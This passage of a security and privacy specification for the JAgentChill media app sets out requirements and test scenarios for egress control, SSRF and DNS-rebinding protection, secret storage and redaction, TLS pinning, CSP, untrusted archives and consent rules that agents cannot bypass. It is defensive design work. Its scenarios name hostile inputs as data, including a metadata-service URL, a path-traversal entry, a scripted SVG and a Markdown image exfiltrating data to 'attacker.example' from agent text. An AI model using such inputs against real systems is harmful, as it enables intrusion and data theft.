inbound exceptions of the product — share links and webhooks, both off unless enabled, and the connector OAuth callback — are the unsigned routes of `server-api.Unsigned route exceptions` and are shown under the same Privacy page heading "Inbound access". [NEW]

#### Scenario: Request to an unlisted host
- **WHEN** server code attempts a request to `example.org`, which matches no enabled row
- **THEN** the request is not sent, the call fails with `EGRESS_BLOCKED`, and the network activity list shows a blocked entry for that host

#### Scenario: Offline mode
- **WHEN** an admin turns on offline mode and a user starts an image generation
- **THEN** the job is not created and the user sees "Offline mode is on"

#### Scenario: Provider removed
- **WHEN** an admin disables a provider
- **THEN** its hosts leave the effective allow-list within 2 seconds without a restart

#### Scenario: Push enabled
- **WHEN** an admin enables push and one phone opts in
- **THEN** the push row is listed as enabled, Network activity shows requests to the push host with purpose `push`, and a captured push payload contains only the notification kind and an opaque id

#### Scenario: Fonts on first use
- **WHEN** a user picks a non-bundled font family for the first time on a device
- **THEN** a prompt names the content host and nothing is downloaded until the user allows it
- **AND** a network capture shows no request to `fonts.googleapis.com` or `fonts.gstatic.com`

#### Scenario: Self-hosted content host
- **WHEN** an admin sets `network.contentHostBaseUrl` to `https://files.example.org/jagentchill/` and a phone paired with that host downloads a transcription model
- **THEN** the consent prompt names `files.example.org`, the request goes to that host only, and the file is accepted only when its SHA-256 equals the manifest value

#### Scenario: Endpoint row lifecycle
- **WHEN** an admin adds and enables a custom endpoint at `https://router.example:8443/v1` and then deletes it
- **THEN** a row for `router.example:8443` exists while the endpoint is enabled and is gone after deletion

### Requirement: Outbound endpoint rules
Every outbound connection of the egress module SHALL obey these rules. Plain `http` to a public address SHALL be refused; `http` is accepted only for loopback, private (RFC 1918, unique-local, link-local) and tailnet addresses, and only after an admin turned on "Allow unencrypted connection on a private network" for that row. A certificate that does not chain to a trusted root SHALL be accepted only for loopback, private and tailnet addresses, only by an `admin`, only after a dialog showing the certificate's subject, issuer, validity and SHA-256 fingerprint, and the accepted fingerprint SHALL be pinned: a changed certificate is refused until accepted again; self-signed acceptance is never offered for a public address. Cloud metadata addresses (`169.254.169.254`, `fd00:ec2::254`, `metadata.google.internal` and equivalents) SHALL always be refused. A redirect to a different host SHALL NOT be followed for provider, endpoint, connector and skill-source calls, and no Gateway, provider or endpoint credential SHALL ever be sent to a host other than the one the row names. A provider's login token is never sent to an overridden base URL; base-URL overrides apply to API-key auth only. The connection SHALL be made to the IP address that was validated, so that a second DNS answer cannot redirect it. [NEW]

#### Scenario: Public plain http
- **WHEN** an admin saves an endpoint `http://203.0.113.10:8080/v1`
- **THEN** the save is refused with a message that unencrypted connections are allowed only on a private network

#### Scenario: Self-signed on a private address
- **WHEN** an admin accepts the self-signed certificate of `https://192.168.1.50:8443` and the server presents a different certificate the next day
- **THEN** calls to that endpoint fail with `runtime/tls-untrusted` until the admin accepts the new certificate

#### Scenario: Metadata address
- **WHEN** an endpoint base URL resolves to `169.254.169.254`
- **THEN** the request is refused with `EGRESS_BLOCKED` and nothing is sent

#### Scenario: Cross-host redirect
- **WHEN** a provider host answers 302 to another host
- **THEN** the redirect is not followed and the API key is not sent to the second host

### Requirement: Outbound request hardening
Any feature that fetches a user- or agent-supplied URL (import from URL, preset pack download, provider result download) SHALL resolve the host, refuse addresses in loopback, link-local, private, unique-local, carrier-grade NAT and multicast ranges and the Gateway's own addresses, connect to the validated IP address only, re-check after each redirect with at most 5 redirects, accept only `https`, enforce a 30-second connect-plus-header timeout and a response size limit of 10 737 418 240 bytes for media and 10 485 760 bytes for metadata, and never forward Gateway, provider or endpoint credentials. Agent-initiated URL imports additionally need the approval rules of `agent-editing-tools.Approval for out-of-project effects`. [NEW]

#### Scenario: Internal address
- **WHEN** a user or the agent asks to import `http://169.254.169.254/latest/meta-data`
- **THEN** the import fails with `EGRESS_BLOCKED` and no request is sent

#### Scenario: Redirect to a private address
- **WHEN** an allowed URL redirects to `https://10.0.0.5/file.mp4`
- **THEN** the fetch is aborted at the redirect with `EGRESS_BLOCKED`

#### Scenario: DNS rebinding
- **WHEN** a host name first resolves to a public address and, on a second lookup, to `127.0.0.1`
- **THEN** the connection is made to the first, validated address and no request reaches loopback

#### Scenario: Oversized metadata response
- **WHEN** a metadata endpoint returns more than 10 MiB
- **THEN** the download is cut off, the request fails with `PAYLOAD_TOO_LARGE`, and memory use for the request stays at or below 16 MiB

### Requirement: Host secret storage
There SHALL be one secrets mechanism on the host. Each secret is one owner-only file `<dataDir>/secrets/<name>` (directory mode `0700`, file mode `0600`; on Windows an ACL for the current user only) written atomically by the server (temporary file in the same directory, flushed, then renamed), and the Gateway configuration the server writes for providers and endpoints SHALL reference it with a file SecretRef so that OpenClaw's bundled provider plugins resolve it natively; secrets used only by the server (generation providers, connectors, webhooks) are read from the same files by the server and are never placed in the Gateway configuration. The product's Gateway identity private key and webhook trigger secrets use the same mechanism, and so do the server-generated Gateway token, link identity and tool endpoint secret, which additionally are never listed or writable (`server-api.Gateway secrets`). Secrets SHALL exist only on the Gateway host: never in project files, op logs, synced state, client storage, RPC parameters, events, job records or `openclaw.json` in plain text. This includes secrets that an endpoint expects in its address: `models.providers.<id>.baseUrl` is a plain string in OpenClaw's configuration, so the server SHALL project to it only the literal, non-secret part of an endpoint URL; a query parameter or user-info value marked `{secret}` in an endpoint record (`agent-runtimes.Shared endpoint record`) is never appended to a projected `baseUrl`, is applied only at request time inside the server's own endpoint client, and an `llm` endpoint that needs one is refused at save with `INVALID_PARAMS` and the message "This endpoint needs its key in the address — agent chat cannot use it; put the key in a header". The doctor and the security audit collector scan the Gateway configuration `openclaw.json`, its backups and the server's `config.json` for values that equal a stored secret or match a provider key format and report `fail secret-in-config` with the key path (never the value); the Gateway token and the tool endpoint secret in the two fields `server-api.Gateway secrets` names are the only values exempt. OpenClaw has no secret vault and no OS-keychain integration on the Gateway side, therefore the product makes no encryption-at-rest claim: Host settings → Secrets SHALL state "Secrets are protected by the file permissions of the account that runs this host". The write and read surface (signed `PUT`/`DELETE /jagentchill/v1/secrets/{name}`, read shape `{ name, scope, set, last4?, updated_ms }`, name pattern, limits) is owned by `server-api.Secret write and read surface`; provider key names and the connect flow by `generation-providers.Provider connection` and `agent-runtimes.Admin proxy and Gateway reuse`, whose auth-profile credentials (OAuth tokens, profile keys) live in OpenClaw's own auth-profile store and never reach a client either. Secrets SHALL be redacted from logs, error messages, audit records, job records and diagnostics bundles, and SHALL be unreachable by agent tools (`security-privacy.Workspace agent safeguards`). [NEW]

#### Scenario: Key is write-only
- **WHEN** an admin stores a provider key and then lists secrets
- **THEN** the response shows `set: true` and the last 4 characters, and no API returns the full value

#### Scenario: File permissions
- **WHEN** the secrets directory is inspected after a write on a macOS, Linux or Windows host
- **THEN** on macOS and Linux the directory has mode `0700` and the secret file mode `0600`, on Windows the ACL of both grants access to the current user only, and on all three no temporary file with the value remains

#### Scenario: Bundled provider resolves the secret
- **WHEN** a bundled image provider is connected with a key written through the secret route
- **THEN** the provider's configuration contains a file SecretRef, not the key, and a generation call succeeds

#### Scenario: Endpoint with a key in the query string
- **WHEN** an admin saves a media endpoint whose record has `query: { key: { secret: "ENDPOINT_X_KEY" } }`
- **THEN** `openclaw.json` and its backups contain neither the key nor a URL with it, a generation call through the server's endpoint client succeeds, and saving the same record with capability `llm` is refused with `INVALID_PARAMS`

#### Scenario: Secret in a provider error
- **WHEN** a provider's error response echoes the API key
- **THEN** the value is replaced by `[redacted]` in the job error, the logs and the client message

#### Scenario: No encryption claim
- **WHEN** the Secrets page is opened on any host
- **THEN** it shows the sentence about file permissions and no text claims that secrets are encrypted

### Requirement: Client-side sensitive storage
Clients SHALL keep device private keys and device tokens — the only credentials a client holds — only in the protected storage defined by `device-pairing-signing.Per-platform device key storage` and `device-pairing-signing.Web client key handling`. The local host registry (Gateway id, name, addresses, public key, verified clock offset) and cached Gateway data are not secret and SHALL be stored in ordinary app storage. No client SHALL write a key, token, verification code or provider secret to a log, crash record, URL, clipboard (except an explicit user "Copy link" of an offer, which contains no secret) or screenshot-visible debug overlay. No client ever receives the Gateway shared token, an OpenClaw device or bootstrap token, or a provider credential. [NEW]

#### Scenario: Log scan
- **WHEN** client logs from a full pairing and one hour of use are scanned
- **THEN** they contain no device token, private key material, verification code or provider key

#### Scenario: Clipboard
- **WHEN** the user copies a pairing link
- **THEN** the clipboard contains only the offer URL

### Requirement: Provider data disclosure and consent
The consent mechanism — what counts as project-derived content (media, frames, transcripts, prompt text that embeds transcript or caption text), the choices "Allow once", "Always allow for <provider>" and "Cancel", per-provider storage on the Gateway, the pre-start check that lists providers lacking consent, the `waiting` state with a consent card for interactive callers, and failure with `PERMISSION_DENIED` after the approval timeout for automation runs — is owned by `generation-providers.Data leaving the machine` and is not restated here; the stored consent records `{providerId, contentKinds[], grantedBy, granted_ms}` and the methods `jagentchill.provider.consent.list`, `.grant`, `.revoke` and `.check` that read and change them are defined there (`generation-providers.Provider RPC surface`), and Privacy → Providers lists and withdraws consent only through them. This capability states the rules it must satisfy: no content SHALL be sent to a provider, endpoint or connector that lacks consent on that Gateway; an agent, workflow, team or automation SHALL NOT be able to grant or bypass consent; consent SHALL be listed and withdrawable under Privacy → Providers; media sent SHALL be limited to the items the action references; and a shared endpoint (proxy, router, aggregator) is a separate consent subject from the upstream provider it forwards to, with the upstream shown when the endpoint reports it. [NEW]

#### Scenario: First generation with a provider
- **WHEN** a user starts a video generation with a provider never used on this Gateway
- **THEN** the consent sheet appears and no request is sent until the user allows it

#### Scenario: Consent withdrawn
- **WHEN** the user removes "Always allow" for a provider under Privacy → Providers
- **THEN** the next action using it shows the consent sheet again

#### Scenario: Agent cannot consent
- **WHEN** an agent's tool call needs a provider lacking consent
- **THEN** the step waits with a consent card for a person, and no tool exists by which the agent can grant it

### Requirement: Provenance and likeness rules
Generated and AI-edited media SHALL keep a provenance record from creation to export, and three capabilities SHALL agree on it: the per-asset record is owned by `media-library.AI-generated asset provenance` and `film-production.Content provenance labels`; embedding provenance metadata in exported files (XMP `Iptc4xmpExt:DigitalSourceType` for images and video, the equivalent comment tag for audio) and the visible "AI-generated" label option (default off) are owned by `export-share.Provenance metadata` and `export-share.AI label burn-in`. The rules this capability imposes on all of them are: the app's own export options SHALL never strip provenance metadata from a file that contains generated or AI-edited content; the visible label is the user's choice and is never forced or removed by an agent; cloning or designing a voice from a recording of a person SHALL require, before any audio is sent, a per-voice attestation by a person on a device ("I have the right to use this voice") stored with the voice record as `{ consent: true, attestedBy: deviceId, attested_ms }`, which an agent, workflow or automation cannot give; a voice without the attestation SHALL be refused by voice-clone and lip-sync routes with `PERMISSION_DENIED`; and uploaded reference images of people carry the same uploader record. [NEW]

#### Scenario: Export keeps provenance
- **WHEN** a project containing a generated clip is exported with every metadata option at its default
- **THEN** the output file carries the digital-source-type metadata

#### Scenario: Voice clone without attestation
- **WHEN** an agent asks to clone a voice from an uploaded recording that has no attestation
- **THEN** the call fails with `PERMISSION_DENIED`, nothing is sent to a provider, and the user is shown the attestation prompt

#### Scenario: Attestation recorded
- **WHEN** a user ticks the attestation and confirms on their phone
- **THEN** the voice record stores the device id and time, and the film provenance view shows the consent flag

### Requirement: Biometric grouping is opt-in
Face clustering and any other biometric-style grouping of people in media (the "People" facet of `ai-editing-tools.Smart search of media`, per-face retouch identities, speaker voice profiles that persist beyond one project) SHALL be off by default and opt-in per library (decision B4): per device library for on-device indexing, and separately per host for indexing on a host, each behind a consent dialog that says what is computed and where ("Faces in your media are grouped on this device" / "…on <host name>"). Face and voice embeddings and the clusters built from them are a distinct data class, `biometric-index`, with these rules on every platform (web, macOS, Windows, Linux, iOS, Android) and on every host: they are never sent to a provider, endpoint or connector; never synchronised between devices or to a host by `cross-device-sync` (each library computes its own); never included in a project package, template, export, share link, diagnostics bundle, backup without `--include-biometric` on the host CLI, or agent tool result (an agent receives only the media item ids a people query returned, and only in a library where the feature is on); they are stored only in the local library index or under `<dataDir>/` with owner-only permissions; and turning the switch off deletes every embedding and cluster of that library within 60 seconds and cancels running indexing jobs. Turning the feature on a host on or off needs `jagentchill.config.write` and is audited. Object, scene, text and colour search facets are not biometric and are unaffected. [NEW]

#### Scenario: Default after import
- **WHEN** a user imports 200 clips into a new library on any platform and indexing completes
- **THEN** no face embedding or cluster exists, the People facet shows "Group people in this library — Turn on", and other facets work

#### Scenario: Opt-in on a device does not enable the host
- **WHEN** the user turns people grouping on for the phone's library while paired with a host
- **THEN** the host computes no face embeddings until an admin separately confirms it for the host

#### Scenario: Switch turned off
- **WHEN** the user turns people grouping off for a library with 40 clusters
- **THEN** within 60 seconds the index holds no embedding or cluster and a byte search of the library folder finds no face vector file

#### Scenario: Biometric data stays out of sync and bundles
- **WHEN** a project from a library with people grouping on is synced, packaged as `.jagentchill` and included in a diagnostics bundle
- **THEN** none of the three contains an embedding, a cluster or a person label

### Requirement: Transport protection
Allowed transports between a client and a host SHALL follow the address kinds of `device-pairing-signing.Address kinds and selection order` (design D7.6): `loopback` — `ws`/`http` on the same machine; `lan` — `wss`/`https` only, always, to the LAN listener of `server-api.Product listeners and path restriction` (TLS 1.3); `tailnet` — `ws`/`http` inside the WireGuard tunnel for the native apps (mobile and desktop clients dial their own tailnet node's loopback proxy), and `wss`/`https` with the browser-trusted `ts.net` certificate for browsers. There is no plaintext LAN option and no setting that creates one. Tailnet encryption protects the path only and SHALL NOT replace any application-layer control: the mutual Ed25519 handshake, device token, per-request signatures and revocation apply identically on every kind. For a `lan` address the desktop main process (macOS, Windows, Linux) and the mobile native transport module `JagentchillTransport` (iOS, Android) SHALL verify the certificate against the `tlsSha256` pin carried in the offer or announced afterwards over an authenticated connection, for both the WebSocket and HTTP requests, and a pin mismatch SHALL abort before any handshake frame or token is sent, with `GATEWAY_UNREACHABLE` reason `tls_pin_mismatch`. A browser cannot pin: it accepts only certificates it trusts and only the origins of `updates-distribution.Web origins`, so it uses a `lan` address only when an admin installed a browser-trusted certificate (decision B2, `device-pairing-signing.Web clients and the tailnet`). Whatever the transport, the Gateway is authenticated by its Ed25519 signature before the device sends a token (`device-pairing-signing.Mutual authentication of the Gateway`), every HTTP request is individually signed, and there is one connection: no second socket with different protection exists. [NEW]

#### Scenario: Pinned certificate matches
- **WHEN** a mobile client connects to a `wss` LAN address whose certificate hash equals the pin
- **THEN** the connection proceeds to the channel P handshake

#### Scenario: Certificate replaced
- **WHEN** the certificate presented does not match the pin
- **THEN** the client aborts before sending any handshake frame and shows `GATEWAY_UNREACHABLE` with the pin-mismatch explanation

#### Scenario: Certificate renewed by the host
- **WHEN** the host renews its LAN certificate and announces the new pin to a connected phone
- **THEN** the phone stores the new pin and its next LAN connection succeeds without a new pairing

#### Scenario: No plaintext LAN anywhere
- **WHEN** the configuration schema, the settings pages and the offers of a host at every Network access level are inspected
- **THEN** no key, switch or address allows `ws` or `http` to a LAN address

### Requirement: Gateway bind and exposure policy
The Gateway's native port SHALL listen on loopback always, on every host platform; the "Network access" levels (`desktop-app.Network access setting`, identical on macOS, Windows and Linux; `jagentchill tailnet` and `jagentchill lan` on a headless host) never change the Gateway's bind or the server's own loopback bind — "Tailnet" starts the tailnet listener and "Local network (encrypted)" starts the LAN listener, both path-restricted reverse proxies of `server-api.Product listeners and path restriction` that forward only `/jagentchill/` and attach the real peer address. Nothing else of the Gateway (Control UI, native socket, OpenAI-compatible endpoints, routes of OpenClaw's own plugins) and nothing of the server outside `/jagentchill/` (the agent tool endpoint `/agent-tools/mcp`, the local admin endpoint) is reachable from the tailnet or the LAN; the listeners forward to the server's loopback port only and have no route to the Gateway port. The product operates no relay or rendezvous server and never enables a public tunnel or funnel. `jagentchill doctor`, the security audit collector and Host settings SHALL report as `fail` a core bind other than loopback and a Gateway auth mode other than `token`, and as `warn`: a product listener on an interface with a globally routable address (the LAN listener refuses to bind one), local auto-approval enabled, the OpenAI-compatible HTTP endpoints enabled, the Control UI enabled, OpenClaw's own Tailscale mode other than `off`, and an enabled public route class (share links, webhooks); each finding SHALL name the setting to change. The server SHALL never weaken these settings: `ensureRunProfile()` only tightens (`platform-skeleton.Run profile application`). Share links, webhooks and the connector callback are served only on the listeners that are already enabled; the server opens no additional port. [NEW]

#### Scenario: Core bound to all interfaces
- **WHEN** the core listens on `0.0.0.0`
- **THEN** Host settings show a red banner "This host's Gateway port is exposed to the network" with the remediation text, the product listeners stop, and doctor exits non-zero

#### Scenario: Safe default
- **WHEN** the Gateway runs with the default run profile
- **THEN** Host settings show no exposure warning and no non-loopback port is open

#### Scenario: LAN level exposes only the product listener
- **WHEN** the level is "Local network (encrypted)" and a port scan runs from another machine on the network
- **THEN** only the LAN listener's port answers, with TLS

#### Scenario: Share links enabled
- **WHEN** an admin enables share links
- **THEN** doctor reports `warn public-routes: share links enabled`

### Requirement: Desktop and embedded web hardening
The desktop renderer SHALL run with `contextIsolation` on, `nodeIntegration` off, `sandbox` on and `webSecurity` on, loading the app only from `app://jagentchill`; navigation to any other origin and `window.open` SHALL be denied and external links SHALL open in the system browser after scheme validation (`https`, `mailto` only). The preload bridge SHALL expose a fixed, typed set of IPC channels and no generic invoke. The web app's origin serves no other script-bearing content (`server-api.Web origin isolation`). This requirement owns the single Content-Security-Policy text of the product, used by the web build and implemented for the desktop app by `desktop-app.Renderer content security policy and navigation`: `default-src 'self'`; `script-src 'self' 'wasm-unsafe-eval'` (no `unsafe-eval`, no inline scripts); `style-src 'self' 'unsafe-inline'`; `img-src 'self' blob: data:` plus, on desktop, `jagentchill-gw:` and `jagentchill-file:`; `media-src 'self' blob:` plus the same two schemes on desktop; `font-src 'self' blob:`; `frame-src 'none'`; `object-src 'none'`; `base-uri 'self'`; `worker-src 'self' blob:` (the app's own scripts start their workers from `blob:` URLs; without the directive `script-src` is the fallback and every worker is refused); and `connect-src` — on desktop set by the main process to `'self'`, the addresses of paired Gateways and the enabled client hosts of `security-privacy.Network egress control`, updated when they change; on web `'self' ws: wss: https: http://localhost:* http://127.0.0.1:*`, with destinations enforced by the client egress module and the signing service worker, which refuse hosts that are neither paired nor enabled. Model output SHALL never cause a network load: remote images, frames and auto-loading media in agent text are not fetched (rendering rule owned by `chat-agent.Assistant text rendering`), which the `img-src`, `media-src` and `frame-src` directives enforce. The mobile engine view (`JagentchillEngineView`) SHALL load only bundled content and its local media origin (`https://engine.jagentchill.localhost/` on Android, `jagentchill-engine://app/` on iOS), SHALL have no access to device APIs beyond its message bridge, and SHALL reject bridge messages that fail schema validation. [NEW]

#### Scenario: Renderer navigation blocked
- **WHEN** content in the desktop renderer attempts to navigate the window to `https://example.org`
- **THEN** the navigation is cancelled and the URL opens in the system browser

#### Scenario: Inline script blocked
- **WHEN** an HTML string containing an inline `<script>` is inserted into the DOM
- **THEN** the script does not execute and a CSP violation is recorded in the local log

#### Scenario: Remote image in agent text
- **WHEN** an assistant message contains a Markdown image pointing at `https://attacker.example/x.png?d=<data>`
- **THEN** no request to that host is made on web, desktop or mobile

#### Scenario: Desktop connect-src blocks an unpaired host
- **WHEN** renderer script calls `fetch("https://example.org/")`
- **THEN** the request is blocked by `connect-src` and a violation is logged

#### Scenario: Malformed message to the engine surface
- **WHEN** the mobile engine view receives a bridge message that does not validate
- **THEN** the message is dropped, an error is logged, and the engine state is unchanged

### Requirement: Untrusted file and pack handling
Imported media, subtitle files, LUT files, fonts, sticker packs, template packs (`.jctpl`), preset packs (`.jcpack`), project packages (`.jagentchill`), workflow files (`.jcworkflow`), script files (`.jcscript` and text imports), skill folders and archives SHALL be treated as untrusted: parsed with size and count limits (archive entries at most 10 000, total expanded size at most 21 474 836 480 bytes, expansion ratio at most 100:1, no entry path containing `..` or an absolute path, no symbolic links), validated against their schema before use, and never executed. SVG stickers SHALL be rasterised or sanitised to remove scripts, external references and event handlers. Template and preset packs SHALL contain data only; any embedded script or shader source outside the documented shader-preset schema SHALL cause the pack to be refused with a message naming the offending entry. Skills are instructions and scripts for agents and are admitted only through `skills.Trust prompt before install`. [NEW]

#### Scenario: Zip bomb
- **WHEN** a 1 MB pack expands beyond a 100:1 ratio
- **THEN** import stops, partial files are deleted, and the user sees "This pack was not imported: archive too large when expanded"

#### Scenario: Path traversal entry
- **WHEN** an archive contains the entry `../../evil.js`
- **THEN** the pack is refused and nothing is written outside the import staging directory

#### Scenario: Scripted SVG
- **WHEN** an SVG sticker containing a `<script>` element and an `onload` attribute is imported
- **THEN** the stored sticker contains neither and renders as a static image

### Requirement: OS permission requests
The app SHALL request camera, microphone, photo-library, notification and local-network permissions only at the moment a feature needs them, each preceded by an in-app explanation of one sentence naming the feature. A denied permission SHALL leave the rest of the app working, SHALL show an inline state with "Open Settings" on the feature that needs it, and SHALL NOT be re-requested automatically in the same session. On iOS and Android the app SHALL request the limited photo-library access level where the platform offers it. [NEW]

#### Scenario: Microphone for voiceover
- **WHEN** a user starts a voiceover recording for the first time
- **THEN** the explanation is shown, followed by the OS prompt, and no microphone prompt appeared earlier in the app's life

#### Scenario: Camera denied
- **WHEN** the user denies camera access for QR scanning
- **THEN** pairing by pasted link and by short code still works

### Requirement: In-app privacy and legal notices
The About page SHALL contain: a privacy notice (bundled with the app, readable offline) that states there are no accounts, no telemetry, where data is stored, that agents and terminals can run commands on the host when an admin allows it, and which features send data to user-configured providers; the third-party licence notices from `THIRD_PARTY_NOTICES.md` and `THIRD_PARTY_NOTICES.md`; the product licence text; and the app, protocol and Gateway versions. These documents SHALL be available in `en`, `vi` and `ja` for the privacy notice and in their original language for licence texts. The app SHALL NOT require acceptance of terms to use the local editor, and SHALL NOT link to a hosted privacy or terms page as the only source. [PORT W-014] [NEW]

#### Scenario: Read offline
- **WHEN** a device with no network opens About → Privacy
- **THEN** the full notice is displayed

#### Scenario: Licence list complete
- **WHEN** the licence screen is compared with the shipped dependency list of that build
- **THEN** every shipped third-party package has an entry

### Requirement: Data erasure
Each client SHALL provide "Erase all data on this device" (Privacy page), which after a confirmation that requires typing `ERASE` SHALL delete all local projects, media, caches, logs, feedback, host registry entries, device tokens and the device key, and return the app to its first-run state within 60 seconds for up to 50 GiB of data on the reference desktop of `diagnostics-quality.Reference devices`. An admin SHALL be able to run "Erase host data" (and `jagentchill erase --yes` on the stopped host), which SHALL delete everything under `<dataDir>/` (configuration, database, blobs, workspaces, exports, backups, secrets, usage data, and the supervised Gateway's state directory `gateway-state/` with every agent session, transcript, credential and configuration entry in it), revoke every device, and leave untouched any OpenClaw installation of the host account outside the data directory (for example `~/.openclaw`), which the product never reads or writes. Both actions SHALL state exactly what is deleted and that it cannot be undone. [NEW]

#### Scenario: Erase a device
- **WHEN** the user types `ERASE` and confirms
- **THEN** on next launch the app shows the first-run Home with no projects and no paired host
- **AND** the platform key store no longer contains the device key

#### Scenario: Erase on web
- **WHEN** the same action completes in a browser
- **THEN** the origin's IndexedDB databases and OPFS directory are empty and the service worker cache is cleared

#### Scenario: Wrong confirmation text
- **WHEN** the user types `erase all`
- **THEN** the confirm button stays disabled

#### Scenario: Erase host data
- **WHEN** an admin erases host data
- **THEN** the `jagentchill/` directory under the state directory holds no product data, every channel P connection is closed with code 4403, and OpenClaw's own configuration file keeps its non-JAgentChill content

### Requirement: Log and diagnostics redaction
All log writers and the diagnostics bundle SHALL pass output through one redaction function that removes: values of any field whose name is or ends in (case-insensitive) `token`, `secret`, `password`, `passphrase`, `authorization`, `signature`, `apiKey`, `privateKey`, `secretKey`, `authKey`, `proxySecret`, or is one of `verificationCode`, `passcode`, `shortCode`, `authCode`, `value` inside a secret-route body; the fields `code` and `error.code`, WebSocket close codes, `idempotencyKey`, `sessionKey`, `deviceId`, `gatewayId`, `devicePublicKey` and `gatewayPublicKey` are identifiers, not secrets, and SHALL be kept, because the diagnostics bundle and the connection diagnostics screen need them (`diagnostics-quality.Diagnostics bundle`); strings matching known provider key formats; the query string of any URL; file-system paths above the user's home directory replaced with `~`; terminal input and output bytes; and prompt or transcript text longer than 200 characters truncated with a length marker unless the user ticks "Include prompts" at export time. Unit tests SHALL feed a corpus of at least 50 secret-bearing samples through the function and assert that none survives. [NEW]

#### Scenario: Token in an error object
- **WHEN** an error object containing `deviceToken` is logged
- **THEN** the log line shows `deviceToken: "[redacted]"`

#### Scenario: Error codes survive
- **WHEN** an entry `{ error: { code: "TOKEN_EXPIRED" }, closeCode: 4401, idempotencyKey: "k-123", verificationCode: "123456", apiKey: "sk-…" }` is logged
- **THEN** the line keeps `TOKEN_EXPIRED`, `4401` and `k-123` and shows `[redacted]` for `verificationCode` and `apiKey`

#### Scenario: Redaction corpus
- **WHEN** the redaction unit tests run
- **THEN** all 50 or more samples are redacted and the test fails if any original secret substring remains

### Requirement: Supply-chain controls
Release builds SHALL be produced only by CI from a tagged commit with a lockfile-frozen install, SHALL publish a SHA-256 checksum file and a CycloneDX software bill of materials for each artifact, and SHALL fail when `pnpm audit` reports a vulnerability of severity high or critical in a shipped JAgentChill dependency that has a patched version available. The server SHALL implement a security audit collector whose findings are reported by `jagentchill doctor`, by `diagnostics-quality.Host doctor report` and in Host settings, and which also runs `openclaw security audit --json` of the pinned Gateway against the supervised Gateway's state and includes its findings; the JAgentChill findings are (a build whose Gateway differs from a pristine build of the pinned tag, a `@openclaw/gateway-client` version other than the pin, Gateway secrets with wrong file permissions, the agent tool endpoint or the Gateway port reachable on a non-loopback address, core bind not loopback, local auto-approval, auth mode, Control UI or canvas enabled, secret file permissions, secret values in configuration, enabled product listeners and public routes, terminal enabled, "Allow workspace agents for editors" on, sessions in unattended mode, unmanaged workspace sessions, orphaned sessions, devices inactive for 90 days, devices whose key is stored in a file, pending OpenClaw pairing requests the server did not create). [NEW]

#### Scenario: High-severity advisory with a fix
- **WHEN** a shipped dependency has a high-severity advisory and a patched release
- **THEN** the release workflow fails and names the package and advisory id

#### Scenario: Audit collector
- **WHEN** the operator runs `openclaw security audit` on a Gateway with share links and the terminal enabled
- **THEN** the output contains one JAgentChill finding for the public route and one for the terminal, each with severity `warn`

### Requirement: Security-affecting change control
Any change to the handshake transcript, request canonical string, offer format, key storage, role-to-scope mapping, session ownership rule, approval resolver rule, the `CORE_METHODS` list, product listener path and header rules, admin proxy list, secret storage, egress table, run profile, agent tool policy or environment stripping SHALL be accompanied by a decision record under `docs/decisions/` and by an update to the conformance tests in `device-pairing-signing.Pairing protocol conformance tests` or the corresponding security test, in the same pull request. [JAD] [NEW]

#### Scenario: Canonical string changed without a record
- **WHEN** a pull request edits the request-signing module and adds no decision record
- **THEN** the CI job `jagentchill-policy` fails with `security change requires a decision record`

#### Scenario: Change with record and tests
- **WHEN** the pull request includes a decision record and updated conformance cases
- **THEN** the policy job passes
